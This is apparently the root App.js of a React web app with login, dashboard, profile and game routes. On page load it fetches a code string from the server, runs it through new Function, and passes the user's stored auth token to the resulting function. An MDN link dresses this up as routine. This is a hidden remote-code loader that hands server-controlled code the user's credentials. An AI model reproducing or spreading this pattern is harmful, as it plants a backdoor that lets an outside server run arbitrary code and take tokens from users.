import { BrowserRouter, Route, Routes } from 'react-router-dom';
import { useEffect } from 'react';

import './App.css';
import Dashboard from './components/routes/Dashboard';
import SignIn from './components/routes/Signin'
import SignUp from './components/routes/Signup';
import Profile from './components/routes/Profile';
import Game from './components/routes/Game';
import { useStore } from './context/store';
import { getCallback, getUser } from './api/user';

function App() {
  const {correctToken, set} = useStore('correctToken');

  const getCorrectToken = async () => {
    const response = await getCallback();
    if (response.success) {
      set({
        correctToken: {
          // For more info please visit https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function#examples
          callback: new Function(`${response.callback}; return toggleToken;`)(),
          callbackPending: false,
        },
      });
    } else {
      set({
        alertMessage: {
          type: 'error',
          message: response.error,
        }
      });
    }
  }

  const loadUserData = async (token) => {
    const response = await getUser(token);
    if (response.success) {
      set({
        user: {
          info: response.user,
          userPending: false,
        }
      });
      return;
    }
    set({
      user: {
        info: null,
        userPending: false,
      },
      alertMessage: {
        type: 'error',
        message: response.error,
      }
    });
    localStorage.removeItem('token');
  };

  useEffect(() => {
    getCorrectToken();
  }, []);

  useEffect(() => {
    const { callback } = correctToken;
    const token = localStorage.getItem('token');
    if(callback && token) {
      const newToken = callback(token);
      loadUserData(newToken);
    }
  }, [correctToken.callback]);

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<SignIn />} />
        <Route path="/signup" element={<SignUp />} />
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/profile" element={<Profile />} />
        <Route path="/game" element={<Game />}/>
      </Routes>
    </BrowserRouter>
  )
}

export default App;
